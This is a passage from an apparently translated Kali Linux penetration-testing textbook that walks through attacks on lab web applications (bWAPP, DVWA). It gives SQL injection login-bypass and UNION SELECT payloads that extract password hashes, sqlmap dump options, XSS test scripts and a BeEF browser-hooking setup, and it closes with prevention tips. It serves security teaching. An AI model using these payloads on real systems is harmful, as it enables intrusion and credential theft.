![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/a2d052df-0d22-4666-b476-ca23429aed7c.png)

可以从 SQL 查询中确定以下内容：

+   +   `SELECT`语句用于从关系数据库中检索信息。因此，该语句以`SELECT`表中的`username`列开始。

+   `FROM`语句用于指定表的名称。在语句中，我们正在指定**accounts**表。

+   `WHERE`语句用于指定表中的字段。查询指示具有值等于`'`（单引号）的字段。`=`（等于）参数允许我们确保在查询中进行特定匹配。

+   `;`用于结束 SQL 语句。

+   组合后，该语句如下：查询`accounts`表中的`username`列，并搜索任何用户名为`**'**`（单引号）的用户名。

`INSERT`命令用于添加数据。`UPDATE`用于更新数据，`DELETE`或`DROP`用于删除数据，`MERGE`用于在表和/或数据库中合并数据。

1.  让我们尝试组合一些语句。在**Username**字段中使用**`' or 1=1 --`**（`--`后面有一个空格），然后单击**Login**：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/8dcdeaa1-17d5-45c9-b3d3-d58f1ebfd0c3.png)

该语句选择表中的第一条记录并返回它。在检查登录状态后，我们可以看到我们现在以`admin`的身份登录。这意味着第一条记录是`admin`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/0aeb18ef-d3fe-4a0f-bc9e-76d3073cd1b4.png)

该语句选择表中的第一条记录并返回值，即`admin`。

1.  让我们尝试另一个用户并稍微修改我们的代码。我们将尝试以用户`john`的身份登录。将用户名字段插入`john`，将以下 SQL 命令插入密码字段：

```
' or (1=1 and username = 'john') --
```

确保双破折号（`--`）后有一个空格，并点击**Login**执行命令。以下截图显示我们能够成功以用户`john`的身份登录：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/50e354e6-c4cd-4212-9c8a-0ac4cb645a50.png)

这些是您可以使用的一些技术，以绕过对 Web 服务器进行 SQL 注入攻击的身份验证。在下一节中，我们将介绍 SQL 注入漏洞和利用。

# SQL 注入漏洞和利用

在本节中，我们将使用 SQL 注入来探索以下漏洞和利用：

+   使用 GET 发现 SQL 注入

+   读取数据库信息

+   查找数据库表

+   提取诸如密码之类的敏感数据

要开始使用 GET 发现 SQL 注入，请使用以下说明：

1.  打开 OWASP BWA 虚拟机。几分钟后，虚拟机将提供其 IP 地址。

1.  前往您的 Kali Linux（攻击者）机器，并在 Kali Linux 的 Web 浏览器中输入 OWASP BWA 虚拟机的 IP 地址。

1.  点击这里的**bWAPP**应用程序：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/4dc69b92-0578-4865-a8c4-ed1fe4953881.png)

1.  使用`bee`作为用户名，使用`bug`作为密码登录应用程序。然后点击登录：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/25357337-5c86-4788-9715-1c418deaeba8.png)

1.  选择**SQL 注入（搜索/GET）**选项，并单击**Hack**继续：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/367d8a9e-363e-4285-b6a8-026ae4861c92.png)

1.  将出现一个搜索框和表。当您在搜索字段中输入数据时，将使用 GET 请求从 SQL 数据库中检索信息并在网页上显示它。现在，让我们搜索包含字符串`war`的所有电影：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/82a4d2aa-7ecd-40aa-85b3-f53c20dc10d6.png)

**免责声明**：前面截图中可见的信息是从 Metasploitable 虚拟机中的本地存储的数据库中检索到的；具体来说，它位于 bWAPP 易受攻击的 Web 应用程序部分。此外，使用的虚拟机位于隔离的虚拟网络中。

仔细观察网页浏览器中的 URL，我们可以看到`sqli_1.php?title=war&action=search`被用来从数据库返回/显示结果给我们。

1.  如果我们在搜索字段中使用`1'`字符，当使用`sqli_1.php?title=1'&action=search`时，我们将得到以下错误：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/98184d34-39c8-4867-b10e-e14983e270a6.png)

这个错误表明目标容易受到 SQL 注入攻击。错误表明我们在搜索字段中插入的语法存在问题。此外，错误显示数据库是一个 MySQL 服务器。这种泄露错误不应该以这种方式向用户公开。数据库错误应该只能被数据库管理员/开发人员或其他负责人访问。这表明 Web 应用程序和数据库服务器之间存在配置错误。

1.  将 URL 调整为`http://192.168.56.101/bWAPP/sqli_1.php?title=1' order by 7-- -`，我们得到以下响应：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/e775c7de-ddd0-4fee-9860-7bcdeea5202e.png)

输出表明至少有七个表。我们通过在 URL 中使用`order by 7-- -`来得知这一点。请注意，在下一步中，当我们调整 URL 以检查额外的表时，我们会收到一个错误。

1.  让我们通过以下 URL 检查是否有八个表：`http://192.168.56.101/bWAPP/sqli_1.php?title=1' order by 8-- -`。正如我们所看到的，返回了一个错误消息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/323bc279-8d5e-47ba-bb84-da0593b1a62a.png)

因此，我们可以确认我们有七个表。

1.  现在，我们可以将 URL 调整为`http://192.168.56.101/bWAPP/sqli_1.php?title=1' union select 1,2,3,4,5,6,7-- -`。下面的截图显示了结果。Web 应用程序（bWAPP）在同一行中返回值`2`，`3`，`5`和`4`。因此，我们可以确定表`2`，`3`，`4`和`5`容易受到攻击：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/98ad17d6-f08d-4d9e-84de-871bb24941c2.png)

1.  要检查数据库版本，我们可以在以下 URL 中将`@@version`替换为一个有漏洞的表，得到`http://192.168.56.101/bWAPP/sqli_1.php?title=1' union select 1, @@version,3,4,5,6,7-- -`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/dd33688b-c824-4c75-ae8a-c456bba50eac.png)

1.  现在我们可以尝试通过以下 URL 获取表名`http://192.168.56.101/bWAPP/sqli_1.php?title=1' union select 1,table_name,3,4,5,6,7 from information_schema.tables-- -`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/d7ed96cb-695a-4fa9-9cc5-ae2cad9596fc.png)

现在，我们已经获得了数据库中的所有表。以下表是由开发人员创建的：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/d83a745e-bd75-4e27-8ff2-f9e026eec4e7.png)

1.  我们现在将尝试从`users`表中检索用户凭据。首先，我们需要从用户表中获取列的名称。您可能会遇到 PHP 魔术方法的一个小问题：错误不允许我们在 PHP 魔术方法中插入/查询字符串。例如，如果我们在 URL 中插入`users`字符串，那么我们将无法从`users`表中检索信息，这意味着数据库不会返回任何列。为了绕过这个错误，将`users`字符串转换为 ASCII。`users`的 ASCII 值是**117 115 101 114 115**。

1.  现在，我们可以继续仅从`users`表中检索列。我们可以使用以下 URL：`http://192.168.56.101/bWAPP/sqli_1.php?title=1' union select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name=char(117,115,101,114,115)-- -`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/ab801668-4069-4176-ad37-e2c2795ca39d.png)

`Char()`允许 SQL 注入在 MySQL 中插入语句而不使用双引号（`""`）。

1.  使用`http://192.168.56.101/bWAPP/sqli_1.php?title=1' union select 1,login,3,4,5,6,7 from users-- -`，我们可以查看`users`表中的`email`列，如*步骤 14*中所述：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/a9404840-c8c5-414b-9f68-c82e4538f851.png)

1.  要检索密码，请将 URL 调整为`http://192.168.56.101/bWAPP/sqli_1.php?title=1' union select 1,password,3,4,5,6,7 from users-- -`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/b8d3bb1a-b5fb-4e19-abd2-b089848d861d.png)

1.  现在，我们有密码的哈希值。我们可以使用在线或离线哈希标识符来确定哈希的类型：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/14790ef2-d5ac-49cc-bf51-6156bbc9dcd4.png)

1.  此外，您可以使用在线哈希解码器，如**CrackStation**（[`crackstation.net/`](https://crackstation.net/)）来执行解密：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/81cb42b8-e5a9-44ee-9c4d-fb4203a05eb5.png)

通过在 Web 浏览器的 URL 中操纵 SQL 语句，我们成功地从 SQL 服务器中检索了用户凭据。

在接下来的部分中，我们将学习如何在目标服务器上使用 POST 检测 SQL 注入。

# 发现 POST 中的 SQL 注入

在这个练习中，我们将尝试发现是否可以使用 POST 进行 SQL 注入。**POST**方法用于向 Web 服务器发送数据。这种方法不像**GET**方法，后者用于检索数据或资源。我们将使用以下拓扑来完成这个练习：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/532081a3-3b69-4443-83e4-11720942af8a.png)

要开始使用 POST 检测 SQL 注入，请使用以下说明：

1.  在您的 Kali Linux 机器上启用 Burp 代理，并确认您的 Web 浏览器代理设置是否正确。如果您不确定，请参考第七章，*使用漏洞扫描器*，特别是*Burp Suite*部分，其中包含了配置 Burp Suite 在 Kali Linux 机器上的所有细节。

1.  确保在 Burp Suite 上启用**拦截**，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/74cefbdc-7413-40e9-aab8-039535ef7067.png)

1.  在 Kali Linux 上的 Web 浏览器中输入 OWASP BWA IP 地址。

确保在 Burp Suite 上定期单击**转发**按钮，以在 Kali Linux Web 浏览器和 OWASP BWA Web 服务器之间转发数据。

1.  单击**bWAPP**，如下截屏所示。使用凭据`bee`（用户名）和`bug`（密码）登录**bWAPP**门户。请注意，这些是**bWAPP**虚拟机的默认用户凭据：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/252ee273-f27c-4cc8-9214-36fe87ab8050.png)

1.  在右上角，使用下拉菜单选择**SQL 注入（搜索/POST）**，然后单击**Hack**加载漏洞：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/27bd4782-4a1e-467c-b04f-ae15ab3b14c2.png)

1.  在搜索字段中输入一个词并单击**搜索**提交（发布）数据：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/341bfc3c-0011-4442-b037-690bc2042362.png)

数据库将通过声明是否找到电影来做出响应。

1.  在 Burp Suite 中，选择目标|站点地图选项卡，查看 Kali Linux 上的 Web 浏览器与 OWASP BWA Web 服务器之间的所有**GET**和**POST**消息。

1.  选择最近的**POST**消息，其中应包含您刚刚执行的搜索：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/6be97d31-cd41-499b-84cd-fcbea98e164b.png)

以下显示了此**POST**消息的内容：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/6411e822-e04b-430d-b2b2-939a1e3db431.png)

1.  在`Raw`内容窗口中的任何位置右键单击，并选择**保存项目**选项。在 Kali Linux 的桌面上将文件保存为`postdata.txt`。

1.  文件保存成功后，让我们使用 SQLmap 在目标服务器上发现任何 POST 中的 SQL 注入（SQLi）漏洞。使用以下命令执行此任务：

```
sqlmap –r /root/Desktop/postdata.txt
```

1.  SQLmap 将尝试检查任何/所有`POST`参数，并确定应用程序是否存在漏洞。以下显示了一些可能的漏洞：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/0cff3574-e7c6-4bbf-ae1e-385b1cb77036.png)

在前面的屏幕截图中，SQLmap 能够注意到`'title'`参数可能是易受攻击的，并且数据库也可能是 MySQL 平台。此外，以下是找到的一个可注入参数的示例：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/0a9562f0-5ef4-4915-9f2c-03f451eaef02.png)

前面的屏幕截图显示，SQLmap 已确定`'title'`参数也容易受到 SQL 注入攻击。最后，以下是 SQLmap 有效载荷：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/6922c792-ea44-4015-a8cd-20dd2b02106e.png)

在这里，SQLmap 为我们提供了一些关于已经测试过的内容、测试方法和结果的总结。通过 SQLmap 给出的信息，我们知道目标网站在 POST 中对 SQLi 攻击是易受攻击的，并且如何利用特定有效载荷来利用弱点。

完成了这个练习后，您现在可以使用 Burp Suite 和 SQLmap 来发现 POST 消息中的 SQL 注入漏洞。

在下一节中，您将学习如何使用 SQLmap 工具来发现 SQL 注入。

# 使用 SQLmap 检测 SQL 注入并提取数据

SQLmap 是一种自动 SQL 注入工具，允许渗透测试人员发现漏洞，执行利用攻击，操纵记录，并从数据库中检索数据。

要使用 SQLmap 执行扫描，请使用以下命令：

```
sqlmap –u "http://website_URL_here"
```

此外，以下参数可用于执行各种任务：

+   `--dbms=database_type`：执行后端暴力攻击。例如`--dbms=mysql`。

+   `--current-user`：检索当前数据库用户。

+   `--passwords`：枚举密码哈希。

+   `--tables`：枚举数据库中的表。

+   `--columns`：枚举表中的列。

+   `--dump`：转储数据表条目。

在下一节中，我们将讨论预防 SQL 注入的方法。

# 防止 SQL 注入

在本节中，我们将简要介绍一些重要的技术，以最小化和预防系统上的 SQL 注入攻击。我们还将以简单的格式查看最佳实践。

以下技术可用于防止 SQL 注入攻击：

+   以最低权限运行数据库服务。

+   使用**Web 应用程序防火墙**（**WAF**）或 IDS/IPS 监视所有数据库流量。

+   清理数据。

+   过滤所有客户端数据。

+   在用户端抑制错误消息。

+   使用自定义错误消息而不是默认消息。

+   使用安全 API。

+   定期对数据库服务器进行黑盒渗透测试。

+   通过对用户输入的参数集合执行类型和长度检查；这可以防止代码执行。

在下一节中，我们将学习**跨站脚本**（**XSS**）漏洞。

# 跨站脚本漏洞

如前一章所述，XSS 允许攻击者将客户端脚本注入到其他用户查看的网页中。因此，当一个毫不知情的用户访问包含恶意脚本的网页时，受害者的浏览器将自动在后台执行这些恶意脚本。

在本节中，我们将通过以下主题来发现各种 XSS 漏洞：

+   理解 XSS

+   发现反射型 XSS

+   发现存储型 XSS

+   利用 XSS-将易受攻击的页面访问者连接到 BeEF

在下一节中，我们将学习什么是 XSS。

# 理解 XSS

如前一章所述，XSS 攻击是通过利用动态创建的网页中的漏洞来完成的。这允许攻击者将客户端脚本注入到其他用户查看的网页中。当一个毫不知情的用户访问包含 XSS 的网页时，用户的浏览器将开始在后台执行恶意脚本，而受害者并不知情。

在接下来的练习中，我们将在 OWASP BWA 虚拟机上同时使用**WebGoat**和**bWAPP**：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/74a30c5d-1318-4654-ab44-db4f38e2d253.png)

**WebGoat**的用户名/密码是`guest`/`guest`。**bWAPP**的用户名/密码是`bee`/`bug`。

接下来，我们将看一下反射型 XSS。

# 发现反射型 XSS

在反射型 XSS 攻击中，数据被插入，然后反射回到网页上。在这个练习中，我们将走过发现目标服务器上反射型 XSS 漏洞的过程。

要完成此任务，请执行以下说明：

1.  导航到**bWAPP**应用程序并登录。

1.  选择**跨站脚本 - 反射（GET）**，然后单击**Hack**以启用此漏洞页面：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/4a7b6e9b-a189-4c8d-bdaa-2e4c2bcf6251.png)

1.  在表单中不输入任何细节，单击**Go**。查看网页浏览器地址栏中的 URL，您可以看到 URL 可以被编辑：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/84b995db-5825-4449-b660-8bab450a5653.png)

1.  要测试字段是否容易受到反射型 XSS 攻击，我们可以在**名字**字段中插入自定义 JavaScript。插入以下 JavaScript：

```
<script>alert("Testing Reflected XSS")
```

在**姓**字段中，使用以下命令关闭脚本：

```
</script>
```

以下截图显示了您需要做的事情：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/02349b59-a85d-47ab-93fe-ad984c56906b.png)

1.  单击**Go**在服务器上执行脚本。将出现以下弹出窗口：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/de4069fa-a416-4839-be7b-fb294cf4a768.png)

这表明脚本在目标服务器上无任何问题地运行；因此，服务器容易受到 XSS 攻击。

在接下来的部分，我们将看一下存储的 XSS。

# 发现存储的 XSS

在存储的 XSS 中，渗透测试人员注入恶意代码，该代码将存储在目标数据库中。

在这个练习中，我们将走过发现目标服务器上存储的 XSS 漏洞的过程。

要完成此任务，请使用以下说明：

1.  导航到 bWAPP 应用程序并登录。

1.  选择**跨站脚本 - 存储（博客）**，然后单击**Hack**以启用此漏洞页面：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/c8c0b4d1-83fd-4c93-b35d-b6686329f9c2.png)

1.  您可以在文本字段中输入任何消息，然后单击提交。输入的文本现在将存储在数据库中，就像在线留言板、论坛或带有评论部分的网站一样：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/2d5bd725-8ad3-46f5-9eab-2b9409a0ac4f.png)

此外，我们可以看到表格、字段和列。

1.  我们可以在文本字段中输入以下脚本，然后单击**提交**：

```
<script>alert("Testing Stored XSS")</script>
```

1.  提交脚本后，您将收到以下弹出窗口，验证它成功运行：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/b8b74ea1-6c52-4702-9d03-113931a1d321.png)

看着表格，有第二行没有任何实际条目：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/9b131d08-9ccf-4012-bf1a-6a1c1239211b.png)

这个新条目反映了我们的脚本已被插入并存储在数据库中。如果有人打开这个网页，脚本将自动执行。

在接下来的部分中，我们将演示如何利用**浏览器利用框架**（**BeEF**）来利用 XSS 漏洞。

# 利用 XSS – 钩住易受攻击页面的访客到 BeEF

BeEF 是一种安全审计工具，由渗透测试人员用来评估系统和网络的安全状况，并发现漏洞。它允许您钩住客户端浏览器并利用它。钩住是指让受害者点击包含 JavaScript 代码的网页的过程。然后，受害者的网页浏览器会处理 JavaScript 代码，并将浏览器绑定到 Kali Linux 上的 BeEF 服务器。

对于这个练习，我们将使用以下拓扑结构：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/6189fb95-6088-4d4d-9b43-31783dfee3a4.png)

让我们开始使用 BeEF 来利用 XSS 漏洞：

1.  要打开 BeEF，转到**应用程序** | **08 – Exploitation Tools** | **beef xss framework**。BeEF 服务将启动并显示以下细节以访问 BeEF 界面：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/18de4963-6b2f-4483-95fe-b19301d2ca72.png)

WEB UI 和 hook URL 很重要。 JavaScript hook 通常嵌入到发送给受害者的网页中。一旦访问，JavaScript 将在受害者的浏览器上执行，并创建到 BeEF 服务器的 hook。 hook 脚本中使用的 IP 地址是 BeEF 服务器的 IP 地址。在我们的实验室中，它是 Kali Linux（攻击者）机器。

1.  Web 浏览器将自动打开到 BeEF 登录门户。如果没有打开，请使用`http://127.0.0.1:3000/ui/panel`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/ee2553fa-1934-4107-80cf-cae16a0952fa.png)

用户名是`beef`，并且在最初启动 BeEF 时将设置密码。

1.  在 Kali Linux 上启动 Apache Web 服务：

```
service apache2 start
```

1.  编辑位于 Web 服务器目录中的网页。

```
cd /var/www/html nano index.html
```

1.  插入如下所示的 HTML 页面头部中的代码：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/4aed4a96-864a-469c-bba6-f0438bfcc84c.png)

IP 地址属于运行 BeEF 服务器的 Kali Linux 机器。

1.  在您的 Windows 机器上，打开 Web 浏览器并插入 Kali Linux 机器的 IP 地址：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/312443b0-41b0-49d5-be63-40b968c9eda9.png)

1.  返回到您的 Kali Linux 机器。您现在有一个被钩住的浏览器。单击被钩住的浏览器：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/fc935547-fba6-4dfa-a583-e6354feffcb7.png)

1.  单击`命令`选项卡。在这里，您可以在受害者的 Web 浏览器上执行操作。让我们在客户端显示一个通知。

1.  单击命令选项卡|社会工程学|伪造通知栏：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/fceefd0d-19bd-4b9a-a606-c93b21655624.png)

最右侧的列将显示攻击的描述。准备好后，单击执行以启动它。

1.  现在，转到 Windows 机器。您会看到 Web 浏览器中出现一个伪造的通知栏：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/728450c8-bf0b-486c-8094-8941ebc67a22.png)

BeEF 允许您对受害者的浏览器界面执行客户端攻击。

在本节中，我们介绍了用于发现目标上的 XSS 漏洞的各种方法和技术，并使用 BeEF 执行了 XSS 利用。在下一节中，我们将执行自动 Web 漏洞扫描。

# 自动发现漏洞

在本节中，我们将介绍使用工具来帮助我们自动发现 Web 应用程序和服务器漏洞。将使用 Burp Suite、Acunetix 和 OWASP ZAP 执行漏洞扫描。

# Burp Suite

在第七章中，*使用漏洞扫描器*，我们概述了使用 Burp Suite 的好处和功能。在本节中，我们将进一步演示如何使用此工具执行自动漏洞发现。

我们可以使用 Burp Suite 对特定页面或网站执行自动扫描。在开始之前，请确保您已配置以下设置：

+   在攻击者机器（Kali Linux）上配置 Web 浏览器以与 Burp Suite 代理一起使用。如果您在此任务中遇到困难，请重新查看第七章，*使用漏洞扫描器*。

+   确保您打开 OWASP BWA 虚拟机并捕获其 IP 地址。

一旦这些配置就位，我们可以开始采取以下步骤：

1.  使用 Kali Linux 机器上的 Web 浏览器导航到 OWASP BWA 虚拟机中的**DVWA**。

1.  单击**SQL 注入**如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/dd2248ee-734a-45ce-9063-29fe5a322ba2.png)

1.  打开 Burp Suite 并确保**拦截**已打开。

1.  在 DVWA 网页上，单击**提交**按钮将 HTTP 请求发送到服务器：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/0a900c70-50af-4042-95aa-cf9952f9ec1d.png)

1.  在 Burp Suite 中，您应该能够看到 HTTP 请求。右键单击上下文窗口中的任何位置，然后选择**执行主动扫描**：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/8370b5cf-c944-47c5-8467-f236801b1ab5.png)

这将允许 Burp Suite 对目标网页执行自动扫描，以发现任何 Web 漏洞。

完成使用 Burp Suite 进行扫描后的结果示例如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/edf2e386-d418-4b5c-963c-a6c202b7f049.png)

选择找到的每个问题将为您提供特定漏洞的详细信息。

在下一节中，我们将学习如何使用 Acunetix 发现 Web 漏洞。

# Acunetix

Acunetix 是业内最受欢迎和认可的 Web 应用程序漏洞扫描器之一。目前，它是财富 500 强公司中使用最广泛的漏洞扫描器之一。Acunetix 旨在通过扫描目标网站或 Web 服务器交付先进的 XSS 和 SQL 注入攻击。

要开始使用 Acunetix，请遵循以下步骤：

1.  转到[`www.acunetix.com/vulnerability-scanner/download/`](https://www.acunetix.com/vulnerability-scanner/download/)并注册试用版本。Acunetix 是一款商业产品，但我们可以获得试用版本进行练习。

1.  完成注册后，您将看到以下屏幕：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/999655ad-e166-4d03-85b6-894acf563d4d.png)

下载 Linux 版本，因为我们将在攻击者机器 Kali Linux 上使用它。

1.  下载`acunetix_trial.sh`文件后，使用`chmod +x acunetix_trial.sh`命令为您的本地用户帐户应用可执行权限。要开始安装，请使用`./acunetix_trial.sh`命令，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/1c66772c-aefe-47bf-a663-6fa7a54bffe2.png)

1.  在命令行界面上，阅读并接受**最终用户许可协议**（**EULA**）。

1.  在 Kali Linux 中打开您的 Web 浏览器，并输入以下地址`https://kali:13443/`，以访问 Acunetix 用户界面。使用在设置过程中创建的用户帐户登录：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/168e73b6-2d46-47a3-ab0d-be81b69ab400.png)

1.  要开始新的扫描，请单击**创建新目标**或**添加目标**，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/11b79283-7d0f-44d3-9ed2-544185c8ae28.png)

1.  **添加目标**弹出窗口将打开，允许您指定目标：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/f7240a89-ff37-42d9-8731-c9ca8faed639.png)

1.  添加目标后，您将看到自定义扫描选项：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/f4b4bd21-dab9-4f71-951c-9315ec2ee22a.png)

现在，我们将保留所有选项的默认设置。

1.  指定扫描类型和报告选项：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/ee4c16f7-db4f-4ead-a9f4-7e8cadf04b1d.png)

Acunetix 允许您为您的业务需求生成以下类型的报告：

+   +   受影响的项目

+   开发人员

+   执行

+   快速

+   合规性报告

+   CWE 2011

+   HIPAA

+   ISO 27001

+   NIST SP800 53

+   OWASP Top 10 2013

+   OWASP Top 10 2017

+   PCI SDD 3.2

+   萨班斯-奥克斯利法案

+   STIG DISA

+   WASC 威胁分类

1.  当您准备好时，请在目标上启动扫描。

扫描完成后，在主 Acunetix 仪表板上提供了摘要，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/15232b4a-ba70-4231-a066-79052ea0ccd8.png)

您可以快速查看扫描的持续时间和发现的任何高风险漏洞。

1.  要查看找到的漏洞的详细列表，请单击**漏洞**选项卡，并选择其中一个 Web 漏洞：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/3aa6b696-150e-41de-bb4e-576aea9dd2cf.png)

要创建报告，请单击**生成报告**。报告向导将允许您根据 Web 应用程序渗透测试的目标指定最合适的报告类型。生成报告后，您可以将文件下载到桌面上。以下是执行报告的 PDF 版本：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/0121a183-9f36-493f-8147-55977b2f0e28.png)

Acunetix 绝对是您渗透测试工具箱中必不可少的工具。它将允许您快速对任何 Web 应用程序进行黑盒测试，并以易于阅读和理解的报告呈现发现结果。

在下一节中，我们将学习如何使用 OWASP ZAP 执行 Web 漏洞评估。

# OWASP ZAP

OWASP **Zed Attack Proxy**（**ZAP**）项目是由 OWASP 创建的免费安全工具，用于发现 Web 服务器和应用程序上的漏洞，具有简单易用的界面。

OWASP ZAP 预先安装在 Kali Linux 中。首先，让我们对目标 OWASP BWA 虚拟机执行 Web 漏洞扫描。

要开始使用 OWASP ZAP，请执行以下步骤：

1.  打开 OWASP ZAP，然后导航到应用程序 | 03-Web 应用程序分析 | OWASP-ZAP。在界面上，点击自动扫描，如下所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/2061bc20-6840-422d-a5ab-51479a9db37a.png)

1.  输入 OWASP BWA 虚拟机的 IP 地址，然后单击“攻击”以开始安全扫描：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/56e0d854-2bfc-443e-ae4c-24fd1c2c81c6.png)

在扫描阶段期间，OWASP ZAP 将对目标执行蜘蛛爬行。**蜘蛛爬行**是一种技术，其中 Web 安全扫描程序检测隐藏的目录并尝试访问它们（爬行）：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/a836afd6-7964-41d5-8651-916ef2632caf.png)

1.  扫描完成后，单击“警报”选项卡，以查看在目标上发现的所有基于 Web 的漏洞及其位置：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/8ba840a6-1592-4fbc-a5c7-5971d905df1e.png)

在选择漏洞后，OWASP 将显示从目标服务器返回的 HTTP 头和正文：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/9eb1000e-c212-4d9b-9706-8f2a5378778f.png)

如果您仔细观察前面的屏幕截图，您会发现 OWASP ZAP 已经突出显示了 Web 编码的受影响区域。

1.  安全扫描完成后，您可以创建和导出报告。要做到这一点，请单击报告 | 生成 HTML 报告。该应用程序将允许您将报告保存到您的桌面。以下是使用 OWASP ZAP 创建的样本报告：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/lrn-kali19/img/7f01fa60-3283-4f1f-9f7b-ec0d599cd970.png)

另外，OWASP ZAP 允许您根据您的需求以多种格式生成报告。一定要探索这个令人惊叹的工具的其他功能。

# 摘要

完成本章后，您现在可以执行 Web 应用程序渗透测试，使用 SQL 注入攻击绕过登录，查找数据库中的表并检索用户凭据，对 Web 应用程序执行各种类型的 XSS 攻击，并成功地使用 BeEF 启动客户端攻击。

我希望本章对你的学习和职业有所帮助。在下一章中，您将学习有关渗透测试最佳实践的知识。

# 问题

以下是基于本章涵盖的主题的一些问题：

1.  用于指定数据库中的表的 SQL 语句是什么？

1.  如何在 SQL 中关闭语句？

1.  如何在数据库中添加新记录？

1.  什么工具可以执行客户端攻击？

# 进一步阅读

